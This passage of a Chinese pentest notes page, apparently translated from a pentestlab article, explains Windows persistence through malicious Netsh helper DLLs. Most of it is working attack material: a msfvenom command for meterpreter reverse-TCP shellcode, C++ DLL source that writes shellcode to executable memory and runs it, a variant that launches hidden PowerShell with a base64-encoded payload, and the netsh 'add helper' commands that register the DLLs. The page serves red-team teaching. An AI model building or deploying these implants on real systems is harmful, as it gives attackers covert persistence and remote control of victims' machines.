https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140618646-1764925445.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140618646-1764925445.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p><a href="https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/"target="_blank" rel="external nofollow noopener noreferrer">注册表运行键的</a>替代方法是，可以使用多种其他方法来启动实用程序，例如创建<a href="https://pentestlab.blog/2019/10/07/persistence-new-service/"target="_blank" rel="external nofollow noopener noreferrer">服务</a>或计划任务。</p>
<hr>
<p>一家总部位于荷兰的IT安全公司，该公司率先在其<a href="https://github.com/outflanknl/NetshHelperBeacon"target="_blank" rel="external nofollow noopener noreferrer">Github</a>存储库中发布概念证明DLL 。DLL是由<a href="https://twitter.com/MarcOverIP"target="_blank" rel="external nofollow noopener noreferrer">Marc Smeets</a>用C编写的，可以对其进行修改以包含自定义的shellcode。Metasploit Framework实用程序“ <strong>msfvenom</strong> ”可用于生成各种语言的shellcode。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">msfvenom</span> <span style="color:#58a1dd">-a</span> <span style="color:#58a1dd">x64</span> -<span style="color:#58a1dd">-platform</span> <span style="color:#58a1dd">Windows</span> <span style="color:#58a1dd">-p</span> <span style="color:#58a1dd">windows</span>/<span style="color:#58a1dd">x64</span>/<span style="color:#58a1dd">meterpreter</span>/<span style="color:#58a1dd">reverse_tcp</span> <span style="color:#58a1dd">-b</span> <span style="color:#a6be9d">&#39;\x00&#39;</span> <span style="color:#ff636f">-f</span> <span style="color:#58a1dd">c</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140719211-121162434.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140719211-121162434.png" alt="C Shellcode – Netsh" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140719211-121162434.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140719211-121162434.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140719211-121162434.png?size=large 2x" data-title="C Shellcode – Netsh" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>可以将生成的shellcode注入到Netsh Helper DLL代码中。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#include 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#include  </span><span style="color:#828b96;font-style:italic">// only required if you want to pop calc
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#ifdef _M_X64
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">unsigned</span> <span style="color:#ff636f">char</span> <span style="color:#58a1dd">buf</span>[] <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb</span><span style="color:#a6be9d">&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#else
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">unsigned</span> <span style="color:#ff636f">char</span> <span style="color:#58a1dd">buf</span>[] <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;</span><span style="color:#a6be9d">\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb</span><span style="color:#a6be9d">&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// Start a separate thread so netsh remains useful.
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">WINAPI</span> <span style="color:#58a1dd">ThreadFunction</span>(<span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">lpParameter</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">newMemory</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">HANDLE</span> <span style="color:#58a1dd">currentProcess</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">SIZE_T</span> <span style="color:#58a1dd">bytesWritten</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">BOOL</span> <span style="color:#58a1dd">didWeCopy</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">FALSE</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">// Get the current process handle 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">currentProcess</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">GetCurrentProcess</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">// Allocate memory with Read+Write+Execute permissions 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">newMemory</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">VirtualAllocEx</span>(<span style="color:#58a1dd">currentProcess</span>, <span style="color:#58a1dd">NULL</span>, <span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">buf</span>), <span style="color:#58a1dd">MEM_COMMIT</span>, <span style="color:#58a1dd">PAGE_EXECUTE_READWRITE</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">newMemory</span> <span style="color:#ff636f">==</span> <span style="color:#58a1dd">NULL</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#ff636f">-</span><span style="color:#a6be9d">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">// Copy the shellcode into the memory we just created 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">didWeCopy</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">WriteProcessMemory</span>(<span style="color:#58a1dd">currentProcess</span>, <span style="color:#58a1dd">newMemory</span>, (<span style="color:#58a1dd">LPCVOID</span>)<span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">buf</span>, <span style="color:#ff636f">sizeof</span>(<span style="color:#58a1dd">buf</span>), <span style="color:#ff636f">&amp;</span><span style="color:#58a1dd">bytesWritten</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> (<span style="color:#ff636f">!</span><span style="color:#58a1dd">didWeCopy</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#ff636f">-</span><span style="color:#a6be9d">2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">// Yay! Let&#39;s run our shellcode! 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    ((<span style="color:#ff636f">void</span>(<span style="color:#ff636f">*</span>)())<span style="color:#58a1dd">newMemory</span>)();
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#a6be9d">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// define the DLL handler &#39;InitHelpderDll&#39; as required by netsh.
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// See https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">extern</span> <span style="color:#a6be9d">&#34;C&#34;</span> <span style="color:#ff636f">__declspec</span>(<span style="color:#58a1dd">dllexport</span>) <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">InitHelperDll</span>(<span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">dwNetshVersion</span>, <span style="color:#58a1dd">PVOID</span> <span style="color:#58a1dd">pReserved</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">//make a thread handler, start the function as a thread, and close the handler 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">HANDLE</span> <span style="color:#58a1dd">threadHandle</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">threadHandle</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">CreateThread</span>(<span style="color:#58a1dd">NULL</span>, <span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">ThreadFunction</span>, <span style="color:#58a1dd">NULL</span>, <span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">NULL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">CloseHandle</span>(<span style="color:#58a1dd">threadHandle</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">// simple testing by starting calculator
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">system</span> (<span style="color:#a6be9d">&#34;start calc&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">// return NO_ERROR is required. Here we are doing it the nasty way
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#ff636f">return</span> <span style="color:#a6be9d">0</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140738377-147276156.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140738377-147276156.png" alt="Netsh帮助程序DLL" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140738377-147276156.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140738377-147276156.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140738377-147276156.png?size=large 2x" data-title="Netsh帮助程序DLL" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>与上述方法类似，<a href="https://github.com/rtcrowley"target="_blank" rel="external nofollow noopener noreferrer">rtcrowley</a>在他的<a href="https://github.com/rtcrowley/Offensive-Netsh-Helper"target="_blank" rel="external nofollow noopener noreferrer">Github</a>存储库中发布了该方法的PowerShell版本。以下代码可用于执行PowerShell Base64编码的有效负载，并支持两个选项。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#include 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#include 
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">WINAPI</span> <span style="color:#58a1dd">YahSure</span>(<span style="color:#58a1dd">LPVOID</span> <span style="color:#58a1dd">lpParameter</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">//Option 1: Quick and simple. Opens 1 PS proc &amp; briefly displays window. Set payload to b64 unicode.
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#58a1dd">system</span>(<span style="color:#a6be9d">&#34;start C:</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">Windows</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">System32</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">WindowsPowerShell</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">v1.0</span><span style="color:#a6be9d">\\</span><span style="color:#a6be9d">powershell.exe -win hidden -nonI -nopro -enc \
</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">                SQBmACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAQgBsAGUALgBQAFMAVgBFAFIAcwBpAG8ATgAuACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">//Option 2: Execute loaded b64 into a reg key value. Will spin up a few etra procs, but will not open an extra window.
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#828b96;font-style:italic">//system(&#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">            $x=((gp HKLM:SOFTWARE\\Microsoft\\Notepad debug).debug); \
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">                powershell -nopro -enc $x 2&gt; nul&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#ff636f">return</span> <span style="color:#a6be9d">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//Custom netsh helper format
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">extern</span> <span style="color:#a6be9d">&#34;C&#34;</span> <span style="color:#ff636f">__declspec</span>(<span style="color:#58a1dd">dllexport</span>) <span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">InitHelperDll</span>(<span style="color:#58a1dd">DWORD</span> <span style="color:#58a1dd">dwNetshVersion</span>, <span style="color:#58a1dd">PVOID</span> <span style="color:#58a1dd">pReserved</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">HANDLE</span> <span style="color:#58a1dd">hand</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">hand</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">CreateThread</span>(<span style="color:#58a1dd">NULL</span>, <span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">YahSure</span>, <span style="color:#58a1dd">NULL</span>, <span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">NULL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">CloseHandle</span>(<span style="color:#58a1dd">hand</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">return</span> <span style="color:#58a1dd">NO_ERROR</span>;
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140809726-1480702117.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140809726-1480702117.png" alt="Netsh Helper DLL – PowerShell方法" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140809726-1480702117.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140809726-1480702117.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140809726-1480702117.png?size=large 2x" data-title="Netsh Helper DLL – PowerShell方法" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>执行“ <strong>netsh</strong> ”实用程序并使用“ <strong>add helper</strong> ”命令加载系统中的两个DLL都将执行集成的有效负载。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">netsh</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">add</span> <span style="color:#58a1dd">helper</span> <span style="color:#58a1dd">C:</span>\<span style="color:#58a1dd">Users</span>\<span style="color:#58a1dd">pentestlab</span>\<span style="color:#58a1dd">Desktop</span>\<span style="color:#58a1dd">NetshHelperBeacon</span>.<span style="color:#58a1dd">dll</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">add</span> <span style="color:#58a1dd">helper</span> <span style="color:#58a1dd">C:</span>\<span style="color:#58a1dd">Users</span>\<span style="color:#58a1dd">pentestlab</span>\<span style="color:#58a1dd">Desktop</span>\<span style="color:#58a1dd">NetshPowerShell</span>.<span style="color:#58a1dd">dll</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140827595-950746634.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140827595-950746634.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140827595-950746634.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140827595-950746634.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140827595-950746634.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>当执行“ <strong>添加帮助程序</strong> ”命令以加载DLL文件时，将在以下位置创建注册表项。</p>
<pre tabindex="0"><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></pre><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111140925305-901798714.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140925305-901798714.png" alt="Netsh注册表项" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140925305-901798714.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140925305-901798714.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111140925305-901798714.png?size=large 2x" data-title="Netsh注册表项" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>应该注意的是，某些可能安装在受感染系统上的VPN客户端可能会自动“ <strong>netsh</strong> ” 启动，因此可能不需要使用其他方法进行持久化。</p>
<h1 id="com劫持" class="heading-element"><span>COM劫持</span>
  <a href="#com%e5%8a%ab%e6%8c%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h3 id="介绍-1" class="heading-element"><span>介绍</span>
  <a href="#%e4%bb%8b%e7%bb%8d-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
